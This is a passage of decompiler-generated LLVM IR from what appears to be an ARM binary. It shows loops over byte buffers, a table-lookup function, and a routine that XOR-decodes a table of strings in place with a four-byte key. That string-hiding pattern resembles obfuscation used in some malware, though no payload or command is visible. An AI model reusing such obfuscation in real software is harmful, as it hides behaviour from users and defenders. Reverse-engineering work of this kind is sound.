  store i32 %v3_eeb028, i32* %r1.global-to-local, align 4
  br i1 %v2_eeac27, label %dec_label_pc_eee4, label %dec_label_pc_eeb8.preheader

dec_label_pc_eeb8.preheader:                      ; preds = %dec_label_pc_ee9c, %dec_label_pc_eea8.backedge
  %v1_ef28 = phi i32 [ %v1_ef2865, %dec_label_pc_eea8.backedge ], [ 1, %dec_label_pc_ee9c ]
  %v0_ef2063 = phi i32 [ %v0_ef20, %dec_label_pc_eea8.backedge ], [ 0, %dec_label_pc_ee9c ]
  %v0_eec461 = phi i32 [ %v3_eeb0, %dec_label_pc_eea8.backedge ], [ %v3_eeb028, %dec_label_pc_ee9c ]
  %v0_eec059 = phi i32 [ %v1_ef24, %dec_label_pc_eea8.backedge ], [ %v1_ee94, %dec_label_pc_ee9c ]
  %v0_eeb857 = phi i32 [ %v3_eea8, %dec_label_pc_eea8.backedge ], [ %v3_eea826, %dec_label_pc_ee9c ]
  br label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %dec_label_pc_eeb8.preheader, %dec_label_pc_eec0
  %v0_ef20 = phi i32 [ %v0_ef2063, %dec_label_pc_eeb8.preheader ], [ 1, %dec_label_pc_eec0 ]
  %v0_eec4 = phi i32 [ %v0_eec461, %dec_label_pc_eeb8.preheader ], [ %v3_eedc, %dec_label_pc_eec0 ]
  %v0_ef24 = phi i32 [ %v0_eec059, %dec_label_pc_eeb8.preheader ], [ %v2_eecc, %dec_label_pc_eec0 ]
  %v0_eeb8 = phi i32 [ %v0_eeb857, %dec_label_pc_eeb8.preheader ], [ %v3_eed0, %dec_label_pc_eec0 ]
  %v7_eeb8 = icmp eq i32 %v0_eeb8, 191
  store i1 %v7_eeb8, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_eeb8, 192
  br i1 %tmp159, label %dec_label_pc_ef20, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eeb8
  %v1_eec0 = add i32 %v0_ef24, 1
  %v2_eec0 = inttoptr i32 %v1_eec0 to i8*
  %v3_eec0 = load i8, i8* %v2_eec0, align 1
  %v4_eec0 = zext i8 %v3_eec0 to i32
  %v2_eec4 = or i32 %v4_eec0, -49152
  %v0_eecc = load i32, i32* @r5, align 4
  %v1_eec8 = add i32 %v0_eecc, %v0_eec4
  %v2_eecc = add i32 %v1_eec8, %v2_eec4
  store i32 %v2_eecc, i32* %r3.global-to-local, align 4
  %v1_eed0 = inttoptr i32 %v2_eecc to i8*
  %v2_eed0 = load i8, i8* %v1_eed0, align 1
  %v3_eed0 = zext i8 %v2_eed0 to i32
  store i32 %v3_eed0, i32* %r2.global-to-local, align 4
  %v2_eed4 = icmp eq i8 %v2_eed0, 0
  store i1 %v2_eed4, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_eedc = mul nuw nsw i32 %v3_eed0, 256
  store i32 %v3_eedc, i32* %r1.global-to-local, align 4
  br i1 %v2_eed4, label %dec_label_pc_eee4, label %dec_label_pc_eeb8

dec_label_pc_eee4:                                ; preds = %dec_label_pc_eea8.backedge, %dec_label_pc_eec0, %dec_label_pc_ee9c
  %v1_eee8 = phi i32 [ 1, %dec_label_pc_ee9c ], [ %v1_ef28, %dec_label_pc_eec0 ], [ %v1_ef2865, %dec_label_pc_eea8.backedge ]
  %v0_eee4 = phi i32 [ 0, %dec_label_pc_ee9c ], [ 1, %dec_label_pc_eec0 ], [ %v0_ef20, %dec_label_pc_eea8.backedge ]
  %v7_eee4 = icmp eq i32 %v0_eee4, 1
  store i1 %v7_eee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eee4, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_eee4
  %v2_eee8 = add i32 %v1_eee8, 1
  store i32 %v2_eee8, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_ef44, %dec_label_pc_eee4, %bb121
  %v1_eeec = phi i32 [ %v5_ef5c, %dec_label_pc_ef44 ], [ %v1_eee8, %dec_label_pc_eee4 ], [ %v2_eee8, %bb121 ]
  %v2_eeec = add i32 %v1_eeec, %v1_ee94
  br label %dec_label_pc_ee1c.backedge

dec_label_pc_ee1c.backedge:                       ; preds = %bb122, %dec_label_pc_ef68
  %v0_ee1c.pre = phi i32 [ %v3_ee28144, %bb122 ], [ %v0_ee1c.pre.pre, %dec_label_pc_ef68 ]
  %storemerge29 = phi i32 [ %v2_eeec, %bb122 ], [ %v2_efe0, %dec_label_pc_ef68 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_ee1c = add i32 %v0_ee1c.pre, -1
  %v3_ee20 = mul i32 %v1_ee1c, 65536
  store i32 %v3_ee20, i32* %r3.global-to-local, align 4
  %v7_ee24 = icmp eq i32 %v3_ee20, -65536
  store i1 %v7_ee24, i1* %cpsr_z.global-to-local, align 1
  %v3_ee28 = urem i32 %v1_ee1c, 65536
  store i32 %v3_ee28, i32* @r8, align 4
  br i1 %v7_ee24, label %dec_label_pc_eda4, label %dec_label_pc_ee30

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eda4
  %v1_eef4 = add i32 %v0_edac, 4
  %v2_eef4 = inttoptr i32 %v1_eef4 to i32*
  %v3_eef4 = load i32, i32* %v2_eef4, align 4
  store i32 %v3_eef4, i32* %r0.global-to-local, align 4
  %v2_eef8 = icmp eq i32 %v3_eef4, 0
  store i1 %v2_eef8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_ef00.161 to i32), i32* @lr, align 4
  %v1_eefc = xor i1 %v2_eef8, true
  call void @__pseudo_cond_branch(i1 %v1_eefc, i32 ptrtoint (i32* @global_var_120a4.55 to i32))
  %v0_ef00 = load i32, i32* @fp, align 4
  store i32 %v0_ef00, i32* @r0, align 4
  %v0_ef04 = call i32 @function_120a4()
  store i32 %v0_ef04, i32* %r0.global-to-local, align 4
  %v0_ef08 = load i32, i32* @r4, align 4
  br label %dec_label_pc_edb8

dec_label_pc_ef10:                                ; preds = %dec_label_pc_ee4c
  %v2_ef10 = icmp eq i32 %v0_ef10, 0
  store i1 %v2_ef10, i1* %cpsr_z.global-to-local, align 1
  %v1_ef14 = add i32 %v0_ef14, 1
  store i32 %v1_ef14, i32* %r3.global-to-local, align 4
  br i1 %v2_ef10, label %bb123, label %dec_label_pc_ee3c.backedge

dec_label_pc_ee3c.backedge:                       ; preds = %dec_label_pc_ef10, %bb123
  %v1_ef1850 = phi i32 [ %v1_ef18, %dec_label_pc_ef10 ], [ %v2_ef18, %bb123 ]
  %v1_ee3c = inttoptr i32 %v1_ef14 to i8*
  %v2_ee3c = load i8, i8* %v1_ee3c, align 1
  %v3_ee3c = zext i8 %v2_ee3c to i32
  store i32 %v3_ee3c, i32* %r2.global-to-local, align 4
  %v2_ee40 = icmp eq i8 %v2_ee3c, 0
  store i1 %v2_ee40, i1* %cpsr_z.global-to-local, align 1
  %v3_ee44 = mul nuw nsw i32 %v3_ee3c, 256
  store i32 %v3_ee44, i32* %r1.global-to-local, align 4
  br i1 %v2_ee40, label %dec_label_pc_ee78, label %dec_label_pc_ee4c.preheader

bb123:                                            ; preds = %dec_label_pc_ef10
  %v2_ef18 = add i32 %v1_ef18, 1
  store i32 %v2_ef18, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ee3c.backedge

dec_label_pc_ef20:                                ; preds = %dec_label_pc_eeb8
  %v2_ef20 = icmp eq i32 %v0_ef20, 0
  store i1 %v2_ef20, i1* %cpsr_z.global-to-local, align 1
  %v1_ef24 = add i32 %v0_ef24, 1
  store i32 %v1_ef24, i32* %r3.global-to-local, align 4
  br i1 %v2_ef20, label %bb124, label %dec_label_pc_eea8.backedge

dec_label_pc_eea8.backedge:                       ; preds = %dec_label_pc_ef20, %bb124
  %v1_ef2865 = phi i32 [ %v1_ef28, %dec_label_pc_ef20 ], [ %v2_ef28, %bb124 ]
  %v1_eea8 = inttoptr i32 %v1_ef24 to i8*
  %v2_eea8 = load i8, i8* %v1_eea8, align 1
  %v3_eea8 = zext i8 %v2_eea8 to i32
  store i32 %v3_eea8, i32* %r2.global-to-local, align 4
  %v2_eeac = icmp eq i8 %v2_eea8, 0
  store i1 %v2_eeac, i1* %cpsr_z.global-to-local, align 1
  %v3_eeb0 = mul nuw nsw i32 %v3_eea8, 256
  store i32 %v3_eeb0, i32* %r1.global-to-local, align 4
  br i1 %v2_eeac, label %dec_label_pc_eee4, label %dec_label_pc_eeb8.preheader

bb124:                                            ; preds = %dec_label_pc_ef20
  %v2_ef28 = add i32 %v1_ef28, 1
  store i32 %v2_ef28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eea8.backedge

dec_label_pc_ef30:                                ; preds = %bb120
  %v1_ef30 = add i32 %v2_ee80, 2
  %v2_ef30 = inttoptr i32 %v1_ef30 to i8*
  %v3_ef30 = load i8, i8* %v2_ef30, align 1
  %v4_ef30 = zext i8 %v3_ef30 to i32
  store i32 %v4_ef30, i32* %r3.global-to-local, align 4
  %v1_ef34 = add i32 %v2_ee80, 3
  %v2_ef34 = inttoptr i32 %v1_ef34 to i8*
  %v3_ef34 = load i8, i8* %v2_ef34, align 1
  %v4_ef34 = zext i8 %v3_ef34 to i32
  store i32 %v4_ef34, i32* %r2.global-to-local, align 4
  %v4_ef38 = mul nuw nsw i32 %v4_ef34, 256
  %v5_ef38 = or i32 %v4_ef38, %v4_ef30
  store i32 %v5_ef38, i32* %r3.global-to-local, align 4
  %v7_ef3c = icmp eq i32 %v5_ef38, 256
  store i1 %v7_ef3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef3c, label %dec_label_pc_ef44, label %dec_label_pc_ee9c

dec_label_pc_ef44:                                ; preds = %dec_label_pc_ef30
  %v1_ef44 = add i32 %v2_ee80, 9
  %v2_ef44 = inttoptr i32 %v1_ef44 to i8*
  %v3_ef44 = load i8, i8* %v2_ef44, align 1
  %v4_ef44 = zext i8 %v3_ef44 to i32
  store i32 %v4_ef44, i32* %r2.global-to-local, align 4
  %v1_ef48 = add i32 %v2_ee80, 8
  %v2_ef48 = inttoptr i32 %v1_ef48 to i8*
  %v3_ef48 = load i8, i8* %v2_ef48, align 1
  %v4_ef48 = zext i8 %v3_ef48 to i32
  %v4_ef4c = mul nuw nsw i32 %v4_ef44, 256
  %v5_ef4c = or i32 %v4_ef48, %v4_ef4c
  %v3_ef50 = mul i32 %v5_ef4c, 65536
  store i32 %v3_ef50, i32* %r3.global-to-local, align 4
  %v3_ef54 = mul nuw nsw i32 %v4_ef48, 256
  store i32 %v3_ef54, i32* %r2.global-to-local, align 4
  %v5_ef5c = or i32 %v3_ef54, %v4_ef44
  store i32 %v5_ef5c, i32* %r0.global-to-local, align 4
  %v7_ef60 = icmp eq i32 %v5_ef5c, 4
  store i1 %v7_ef60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef60, label %dec_label_pc_ef68, label %bb122

dec_label_pc_ef68:                                ; preds = %dec_label_pc_ef44
  %v2_ef68 = inttoptr i32 %v1_ee94 to i8*
  %v3_ef68 = load i8, i8* %v2_ef68, align 1
  %v4_ef68 = zext i8 %v3_ef68 to i32
  store i32 %v4_ef68, i32* %r3.global-to-local, align 4
  store i32 %v2_eb78, i32* %r2.global-to-local, align 4
  %v1_ef74 = add i32 %v2_ee80, 11
  %v2_ef74 = inttoptr i32 %v1_ef74 to i8*
  %v3_ef74 = load i8, i8* %v2_ef74, align 1
  %v4_ef74 = zext i8 %v3_ef74 to i32
  store i32 %v4_ef74, i32* %r2.global-to-local, align 4
  store i32 %v2_eb78, i32* %r3.global-to-local, align 4
  %v1_ef80 = add i32 %v2_ee80, 12
  %v2_ef80 = inttoptr i32 %v1_ef80 to i8*
  %v3_ef80 = load i8, i8* %v2_ef80, align 1
  %v4_ef80 = zext i8 %v3_ef80 to i32
  store i32 %v4_ef80, i32* %r3.global-to-local, align 4
  store i32 %v2_eb78, i32* %ip.global-to-local, align 4
  %v1_ef8c = add i32 %v2_ee80, 13
  %v2_ef8c = inttoptr i32 %v1_ef8c to i8*
  %v3_ef8c = load i8, i8* %v2_ef8c, align 1
  %v4_ef8c = zext i8 %v3_ef8c to i32
  store i32 %v4_ef8c, i32* %r2.global-to-local, align 4
  %v0_ef94 = load i32, i32* @fp, align 4
  %v1_ef94 = inttoptr i32 %v0_ef94 to i8*
  %v2_ef94 = load i8, i8* %v1_ef94, align 1
  %v3_ef94 = zext i8 %v2_ef94 to i32
  %v1_ef98 = mul nuw nsw i32 %v3_ef94, 4
  %v3_ef9c = add nuw nsw i32 %v1_ef98, 4
  store i32 %v3_ef9c, i32* %r1.global-to-local, align 4
  %v1_efa0 = add i32 %v0_ef94, 4
  %v2_efa0 = inttoptr i32 %v1_efa0 to i32*
  %v3_efa0 = load i32, i32* %v2_efa0, align 4
  store i32 %v3_efa0, i32* %r0.global-to-local, align 4
  %v8_efa4 = inttoptr i32 %v3_efa0 to i32*
  %v9_efa4 = call i32 @function_11a8c(i32* %v8_efa4, i32 %v3_ef9c)
  store i32 %v9_efa4, i32* %r0.global-to-local, align 4
  %v0_efa8 = load i32, i32* @fp, align 4
  %v1_efa8 = inttoptr i32 %v0_efa8 to i8*
  %v2_efa8 = load i8, i8* %v1_efa8, align 1
  %v3_efa8 = zext i8 %v2_efa8 to i32
  store i32 %v3_efa8, i32* %r2.global-to-local, align 4
  %v4_efb0 = sext i8 %v3_ef68 to i32
  store i32 %v4_efb0, i32* %r3.global-to-local, align 4
  %v1_efb4 = add nuw nsw i32 %v3_efa8, 1
  store i32 %v1_efb4, i32* %r1.global-to-local, align 4
  %v5_efb8 = mul nuw nsw i32 %v3_efa8, 4
  %v6_efb8 = add i32 %v5_efb8, %v9_efa4
  %v7_efb8 = inttoptr i32 %v6_efb8 to i32*
  store i32 %v4_efb0, i32* %v7_efb8, align 4
  %v1_efbc = load i32, i32* @fp, align 4
  %v2_efbc = add i32 %v1_efbc, 4
  %v3_efbc = inttoptr i32 %v2_efbc to i32*
  store i32 %v9_efa4, i32* %v3_efbc, align 4
  %v0_efc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_efc0 = trunc i32 %v0_efc0 to i8
  %v2_efc0 = load i32, i32* @fp, align 4
  %v3_efc0 = inttoptr i32 %v2_efc0 to i8*
  store i8 %v1_efc0, i8* %v3_efc0, align 1
  %v0_efc4 = load i32, i32* @r4, align 4
  %v1_efc4 = add i32 %v0_efc4, 9
  %v2_efc4 = inttoptr i32 %v1_efc4 to i8*
  %v3_efc4 = load i8, i8* %v2_efc4, align 1
  %v4_efc4 = zext i8 %v3_efc4 to i32
  store i32 %v4_efc4, i32* %r3.global-to-local, align 4
  %v1_efc8 = add i32 %v0_efc4, 8
  %v2_efc8 = inttoptr i32 %v1_efc8 to i8*
  %v3_efc8 = load i8, i8* %v2_efc8, align 1
  %v4_efc8 = zext i8 %v3_efc8 to i32
  %v4_efcc = mul nuw nsw i32 %v4_efc4, 256
  %v5_efcc = or i32 %v4_efc8, %v4_efcc
  %v3_efd0 = mul i32 %v5_efcc, 65536
  store i32 %v3_efd0, i32* %r2.global-to-local, align 4
  %v3_efd4 = mul nuw nsw i32 %v4_efc8, 256
  store i32 %v3_efd4, i32* %r3.global-to-local, align 4
  %v5_efdc = or i32 %v3_efd4, %v4_efc4
  store i32 %v5_efdc, i32* %r0.global-to-local, align 4
  %v0_efe0 = load i32, i32* @r7, align 4
  %v2_efe0 = add i32 %v0_efe0, %v5_efdc
  %v0_ee1c.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_ee1c.backedge

; uselistorder directives
  uselistorder i32 %v3_efd4, { 1, 0 }
  uselistorder i32 %v4_efc4, { 1, 0, 2 }
  uselistorder i32 %v9_efa4, { 1, 0, 2 }
  uselistorder i32 %v3_ef9c, { 1, 0 }
  uselistorder i32 %v5_ef5c, { 1, 2, 0 }
  uselistorder i32 %v3_ef54, { 1, 0 }
  uselistorder i32 %v4_ef44, { 1, 0, 2 }
  uselistorder i32 %v2_ef28, { 1, 0 }
  uselistorder i32 %v3_eea8, { 0, 2, 1 }
  uselistorder i32 %v1_ef2865, { 1, 0 }
  uselistorder i32 %v1_ef24, { 1, 2, 0 }
  uselistorder i32 %v2_ef18, { 1, 0 }
  uselistorder i32 %v3_ee3c, { 0, 2, 1 }
  uselistorder i32 %v1_ef1850, { 1, 0 }
  uselistorder i32 %v1_ef14, { 1, 2, 0 }
  uselistorder i1 %v7_ee24, { 1, 0 }
  uselistorder i32 %v1_ee1c, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_eed0, { 0, 2, 1 }
  uselistorder i32 %v2_eecc, { 1, 2, 0 }
  uselistorder i32 %v0_ef20, { 2, 0, 1 }
  uselistorder i32 %v1_ef28, { 1, 2, 0 }
  uselistorder i32 %v3_eeb028, { 1, 0 }
  uselistorder i32 %v3_eea826, { 1, 0, 2 }
  uselistorder i32 %v1_ee94, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_ee80, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_ee64, { 0, 2, 1 }
  uselistorder i32 %v2_ee60, { 1, 2, 0 }
  uselistorder i32 %v0_ef10, { 2, 0, 1 }
  uselistorder i32 %v1_ef18, { 1, 2, 0 }
  uselistorder i32 %v3_ee4422, { 1, 0 }
  uselistorder i32 %v3_ee3c20, { 1, 0, 2 }
  uselistorder i32 %v0_ee80143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_ee28142, { 1, 0 }
  uselistorder i1 %v7_ee24141, { 1, 0 }
  uselistorder i32 %v1_ee1c134, { 1, 0 }
  uselistorder i1 %v9_edf8, { 1, 0 }
  uselistorder i32 %v0_edb8, { 1, 0 }
  uselistorder i32 %v0_edac, { 1, 0, 2 }
  uselistorder i32 %v0_ed9c, { 1, 0 }
  uselistorder i32 %v0_ed74, { 1, 0 }
  uselistorder i32 %v1_ed28, { 1, 0, 2 }
  uselistorder i1 %v7_ed20, { 1, 0 }
  uselistorder i32 %v5_ed1c, { 1, 0, 2 }
  uselistorder i32 %v1_ece4, { 1, 0 }
  uselistorder i32 %v3_ecd0, { 1, 0 }
  uselistorder i32 %v0_ecc8, { 1, 0 }
  uselistorder i32 %v1_ecbc, { 1, 2, 0 }
  uselistorder i1 %v7_ec74, { 1, 0 }
  uselistorder i32 %v4_ec70, { 1, 0, 2 }
  uselistorder i1 %v7_ec58, { 1, 0 }
  uselistorder i32 %v3_ec54, { 1, 0, 2 }
  uselistorder i1 %v7_ec3c, { 1, 0 }
  uselistorder i32 %v3_ec38, { 2, 1, 0, 3 }
  uselistorder i1 %v7_ec20, { 2, 1, 0 }
  uselistorder i32 %v1_ec24, { 1, 0 }
  uselistorder i32 %v2_ecac, { 1, 0, 2 }
  uselistorder i16 %v5_ebc8, { 1, 0 }
  uselistorder i32 %v2_ebc4, { 1, 0, 2, 3 }
  uselistorder i32 %v6_ebb0, { 1, 2, 0 }
  uselistorder i64 %v5_ebac, { 0, 2, 1 }
  uselistorder i32 %v1_eb98, { 1, 0, 2 }
  uselistorder i32 %v1_eb50, { 1, 0 }
  uselistorder i32 %v1_eb4c, { 1, 2, 0 }
  uselistorder i32 %v2_eb48, { 1, 0 }
  uselistorder i1 %v8_eb34, { 1, 0 }
  uselistorder i32 %v2_eb0c, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 4, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 35, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 32, 33, 36 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 14, 10, 1, 12, 13, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 6, 8, 5, 1, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 22, 24, 21 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 35, 34, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 11, 5, 16, 6, 7, 17, 8, 9, 10, 1, 12, 13, 14, 15, 0, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 2, 27, 28, 29, 30, 35, 32, 33, 31, 34, 37 }
  uselistorder i32 (i32)* @function_126fc, { 8, 7, 11, 10, 9, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10cf8, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_102f8, { 1, 2, 0 }
  uselistorder i32 2048, { 5, 7, 8, 1, 2, 3, 4, 6, 0, 9, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10d34, { 3, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_f9d0, { 11, 15, 14, 13, 12, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_e7dc, { 49, 52, 51, 50, 48, 5, 4, 3, 2, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 12, 11, 10, 9, 8, 7, 6, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 1, 0 }
  uselistorder i32 (i8*)* @function_f93c, { 4, 5, 6, 7, 8, 0, 1, 2, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 76, 77, 78, 39, 40, 41, 42, 43, 44, 45, 46, 47, 69, 70, 71, 72, 73, 74, 75, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder label %dec_label_pc_eea8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_ee3c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_ee1c.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_eeb8, { 1, 0 }
  uselistorder label %dec_label_pc_eeb8.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_ee4c, { 1, 0 }
  uselistorder label %dec_label_pc_ee4c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ee30, { 1, 0 }
  uselistorder label %dec_label_pc_edb8, { 1, 0 }
  uselistorder label %dec_label_pc_eda4, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ed84, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_eb2c, { 1, 0 }
}

define i32 @function_efe8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_efe8:
  %v3_efec = mul i32 %arg1, 8
  %v2_eff0 = add i32 %v3_efec, ptrtoint (i32* @global_var_2061c.163 to i32)
  %v2_eff4 = icmp eq i32* %arg2, null
  br i1 %v2_eff4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_efe8
  %v3_effc4 = inttoptr i32 %v2_eff0 to i32*
  %v4_effc5 = load i32, i32* %v3_effc4, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_efe8
  %v2_eff8 = add i32 %v3_efec, add (i32 ptrtoint (i32* @global_var_2061c.163 to i32), i32 4)
  %v3_eff8 = inttoptr i32 %v2_eff8 to i16*
  %v4_eff8 = load i16, i16* %v3_eff8, align 4
  %v5_eff8 = zext i16 %v4_eff8 to i32
  %v3_effc = inttoptr i32 %v2_eff0 to i32*
  %v4_effc = load i32, i32* %v3_effc, align 4
  store i32 %v5_eff8, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_effc6 = phi i32 [ %v4_effc5, %.thread ], [ %v4_effc, %bb ]
  ret i32 %v4_effc6

; uselistorder directives
  uselistorder i32 %v2_eff0, { 1, 0 }
  uselistorder i32 %v3_efec, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_f00c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f00c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f014 = mul i32 %arg1, 8
  %v2_f018 = add i32 %v3_f014, ptrtoint (i32* @global_var_2061c.163 to i32)
  %v2_f01c = load i32, i32* inttoptr (i32 123896 to i32*), align 8
  %v1_f020 = add i32 %v3_f014, add (i32 ptrtoint (i32* @global_var_2061c.163 to i32), i32 4)
  %v2_f020 = inttoptr i32 %v1_f020 to i16*
  %v3_f020 = load i16, i16* %v2_f020, align 4
  %v3_f024 = udiv i32 %v2_f01c, 256
  %v2_f028 = icmp eq i16 %v3_f020, 0
  %v3_f02c = udiv i32 %v2_f01c, 65536
  store i32 %v3_f02c, i32* @r3, align 4
  %v3_f030 = load i32, i32* @r4, align 4
  store i32 %v3_f030, i32* %stack_var_-16, align 4
  %v1_f034 = urem i32 %v3_f024, 256
  store i32 %v1_f034, i32* %r6.global-to-local, align 4
  %v1_f038 = urem i32 %v3_f02c, 256
  store i32 %v1_f038, i32* %r5.global-to-local, align 4
  %v3_f03c = udiv i32 %v2_f01c, 16777216
  store i32 %v3_f03c, i32* %r4.global-to-local, align 4
  %v1_f040 = urem i32 %v2_f01c, 256
  store i32 %v1_f040, i32* %lr.global-to-local, align 4
  br i1 %v2_f028, label %dec_label_pc_f09c, label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %dec_label_pc_f00c
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_f04c = inttoptr i32 %v2_f018 to i32*
  br label %dec_label_pc_f04c

dec_label_pc_f04c:                                ; preds = %dec_label_pc_f04c.dec_label_pc_f04c_crit_edge, %dec_label_pc_f048
  %v0_f054 = phi i32 [ %v0_f054.pre, %dec_label_pc_f04c.dec_label_pc_f04c_crit_edge ], [ %v1_f040, %dec_label_pc_f048 ]
  %v2_f058 = phi i32 [ %v1_f090, %dec_label_pc_f04c.dec_label_pc_f04c_crit_edge ], [ 0, %dec_label_pc_f048 ]
  %v2_f04c = load i32, i32* %v1_f04c, align 4
  %v2_f050 = add i32 %v2_f04c, %v2_f058
  %v3_f050 = inttoptr i32 %v2_f050 to i8*
  %v4_f050 = load i8, i8* %v3_f050, align 1
  %v6_f050 = zext i8 %v4_f050 to i32
  %v2_f054 = xor i32 %v6_f050, %v0_f054
  %v1_f058 = trunc i32 %v2_f054 to i8
  store i8 %v1_f058, i8* %v3_f050, align 1
  %v2_f05c = load i32, i32* %v1_f04c, align 4
  %v0_f060 = load i32, i32* %ip.global-to-local, align 4
  %v2_f060 = add i32 %v0_f060, %v2_f05c
  %v3_f060 = inttoptr i32 %v2_f060 to i8*
  %v4_f060 = load i8, i8* %v3_f060, align 1
  %v6_f060 = zext i8 %v4_f060 to i32
  %v0_f064 = load i32, i32* %r6.global-to-local, align 4
  %v2_f064 = xor i32 %v0_f064, %v6_f060
  %v1_f068 = trunc i32 %v2_f064 to i8
  store i8 %v1_f068, i8* %v3_f060, align 1
  %v2_f06c = load i32, i32* %v1_f04c, align 4
  %v0_f070 = load i32, i32* %ip.global-to-local, align 4
  %v2_f070 = add i32 %v0_f070, %v2_f06c
  %v3_f070 = inttoptr i32 %v2_f070 to i8*
  %v4_f070 = load i8, i8* %v3_f070, align 1
  %v6_f070 = zext i8 %v4_f070 to i32
  %v0_f074 = load i32, i32* %r5.global-to-local, align 4
  %v2_f074 = xor i32 %v0_f074, %v6_f070
  %v1_f078 = trunc i32 %v2_f074 to i8
  store i8 %v1_f078, i8* %v3_f070, align 1
  %v2_f07c = load i32, i32* %v1_f04c, align 4
  %v0_f080 = load i32, i32* %ip.global-to-local, align 4
  %v2_f080 = add i32 %v0_f080, %v2_f07c
  %v3_f080 = inttoptr i32 %v2_f080 to i8*
  %v4_f080 = load i8, i8* %v3_f080, align 1
  %v6_f080 = zext i8 %v4_f080 to i32
  %v0_f084 = load i32, i32* %r4.global-to-local, align 4
  %v2_f084 = xor i32 %v0_f084, %v6_f080
  store i32 %v2_f084, i32* @r3, align 4
  %v1_f088 = trunc i32 %v2_f084 to i8
  store i8 %v1_f088, i8* %v3_f080, align 1
  %v3_f08c = load i16, i16* %v2_f020, align 4
  %v4_f08c = zext i16 %v3_f08c to i32
  %v0_f090 = load i32, i32* %ip.global-to-local, align 4
  %v1_f090 = add i32 %v0_f090, 1
  store i32 %v1_f090, i32* %ip.global-to-local, align 4
  %v8_f098 = icmp sgt i32 %v4_f08c, %v1_f090
